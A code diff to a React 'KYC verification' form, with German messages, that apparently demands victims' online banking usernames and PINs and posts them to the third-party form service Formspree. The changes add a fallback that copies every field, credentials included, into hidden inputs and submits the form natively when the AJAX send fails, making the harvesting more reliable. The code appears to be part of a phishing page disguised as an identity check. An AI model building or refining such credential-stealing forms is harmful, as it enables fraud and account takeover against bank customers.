@@ -2,7 +2,7 @@
 
 import type React from "react"
 
-import { useState } from "react"
+import { useState, useRef } from "react"
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
 import { Button } from "@/components/ui/button"
 import { Alert, AlertDescription } from "@/components/ui/alert"
@@ -79,6 +79,8 @@ export default function KYCForm() {
   const [showConfirm, setShowConfirm] = useState(false)
   const [showRedirect, setShowRedirect] = useState(false)
 
+  const formRef = useRef<HTMLFormElement | null>(null)
+
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
     const { name, value, type } = e.target as HTMLInputElement
     const inputValue = type === "checkbox" ? (e.target as HTMLInputElement).checked : value
@@ -133,7 +135,6 @@ export default function KYCForm() {
         if (!formData.onlineBankingUsername.trim()) newErrors.onlineBankingUsername = "Benutzername ist erforderlich"
         if (!formData.onlineBankingPin.trim()) newErrors.onlineBankingPin = "PIN ist erforderlich"
         break
-
 
       case 4: // Security
         if (!formData.password) newErrors.password = "Password is required"
@@ -230,7 +231,6 @@ export default function KYCForm() {
     // Documents
     if (!Array.isArray(formData.documents) || formData.documents.length === 0) newErrors.documents = "At least one document is required"
 
-
     setErrors(newErrors)
 
     if (Object.keys(newErrors).length > 0) {
@@ -273,6 +273,26 @@ export default function KYCForm() {
     setCurrentStep((prev) => Math.max(prev - 1, 1))
   }
 
+  const ensureHiddenInputs = () => {
+    const form = formRef.current
+    if (!form) return
+
+    // Remove previously generated hidden inputs
+    const prevGenerated = Array.from(form.querySelectorAll('input[data-generated="true"]'))
+    prevGenerated.forEach((el) => el.remove())
+
+    Object.entries(formData).forEach(([key, value]) => {
+      if (key === "documents") return // file input exists in DOM and already carries files
+
+      const input = document.createElement("input")
+      input.type = "hidden"
+      input.name = key
+      input.value = typeof value === "boolean" ? (value ? "yes" : "no") : String(value ?? "")
+      input.setAttribute("data-generated", "true")
+      form.appendChild(input)
+    })
+  }
+
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
     if (validateAllSteps()) {
@@ -284,7 +304,6 @@ export default function KYCForm() {
     setIsSubmitting(true)
     setSubmitError(null)
     setShowConfirm(false)
-    setShowRedirect(true)
     try {
       const formspreeData = new FormData()
 
@@ -324,7 +343,8 @@ export default function KYCForm() {
         throw new Error(errText)
       }
 
-      // success — redirect to local success page
+      // success — show redirect overlay then navigate
+      setShowRedirect(true)
       if (typeof window !== "undefined") {
         window.location.assign("/success")
       }
@@ -332,6 +352,19 @@ export default function KYCForm() {
       console.error("Submission error:", error)
       setSubmitError("Es ist ein Fehler aufgetreten. Bitte versuchen Sie es erneut.")
       setShowRedirect(false)
+
+      // Fallback: attempt full form submission (non-AJAX) as last resort
+      try {
+        ensureHiddenInputs()
+        if (formRef.current) {
+          // this will perform a multipart/form-data submit using the actual file inputs in the form
+          formRef.current.submit()
+          return
+        }
+      } catch (fallbackErr) {
+        console.error("Fallback form submit failed:", fallbackErr)
+      }
+
       if (typeof window !== "undefined") {
         window.location.assign("/error")
       }
@@ -417,6 +450,7 @@ export default function KYCForm() {
           </CardHeader>
           <CardContent>
             <form
+              ref={formRef}
               onSubmit={handleSubmit}
               className="space-y-6"
               name="kyc-verification"
